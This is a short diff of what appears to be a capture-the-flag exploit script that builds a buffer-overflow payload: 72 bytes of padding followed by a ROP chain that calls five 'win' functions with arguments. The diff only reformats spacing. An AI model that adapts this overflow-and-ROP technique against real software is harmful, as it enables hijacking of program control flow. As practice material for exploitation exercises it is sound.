@@ -3802,11 +3802,11 @@ win5 = 0x402916
 rdi = 0x402d03
 
 payload = b"a"*72  
-payload += p64(rdi) +p64(1) + p64(win1)
-payload += p64(rdi)+p64(2) + p64(win2)
-payload    += p64(rdi) +p64(3) + p64(win3)
-payload += p64(rdi)+p64(4)  + p64(win4)
-payload += p64(rdi)+ p64(5) + p64(win5)
+payload += p64(rdi) + p64(1) + p64(win1)
+payload += p64(rdi) + p64(2) + p64(win2)
+payload    += p64(rdi) + p64(3) + p64(win3)
+payload += p64(rdi) + p64(4) + p64(win4)
+payload += p64(rdi) + p64(5) + p64(win5)
 
 p.send(payload)
 
